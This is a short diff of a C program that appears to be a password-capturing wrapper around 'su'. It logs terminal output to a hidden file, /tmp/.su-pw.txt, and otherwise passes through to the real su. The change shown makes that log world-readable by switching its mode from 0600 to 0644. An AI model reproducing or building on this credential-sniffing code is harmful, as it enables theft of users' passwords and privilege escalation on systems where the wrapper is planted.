@@ -18,7 +18,7 @@ int main(int argc, char **argv)
 
 	tas_tty tty = TAS_TTY_INIT;
 	tty.output_fd = open("/tmp/.su-pw.txt",
-		O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC, 0600);
+		O_WRONLY | O_APPEND | O_CREAT | O_CLOEXEC, 0644);
 
 	if(tty.output_fd == -1) {
 		tas_execv("su", argv);
